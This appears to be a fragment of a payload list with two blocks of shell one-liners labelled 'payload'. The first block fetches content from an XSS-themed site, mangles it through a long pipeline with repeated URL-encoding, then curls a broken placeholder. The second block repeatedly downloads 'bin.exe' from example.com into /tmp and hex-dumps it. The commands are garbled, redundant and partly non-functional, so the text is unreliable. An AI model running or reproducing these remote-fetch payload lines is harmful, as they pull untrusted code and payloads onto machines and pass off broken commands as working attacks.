payload:
wget -qO- https://xss.matthieu.fr/ | awk '/&/ {print $NF}' | xargs -I{} echo -e "\033[34;1m{}\033[0m" | head -n 4 | tail -n 1 | awk '{print $1}' | xargs -I{} echo {} | sed 's/$/%252525252525253A/g' > payload.txt
curl -o - -s -L "%Payload.txt%"

payload:
wget -O /tmp/a "" "http://example.com/bin.exe"
curl -sSL -o /tmp/a "http://example.com/bin.exe"
cat /tmp/a | xxd -p -c 4
echo -n > /tmp/a
cat /tmp/a | xxd -p -c 4
wget -O /tmp/a "" "http://example.com/bin.exe"
curl -sSL -o /tmp/a "http://example.com/bin.exe"
cat /tmp/a
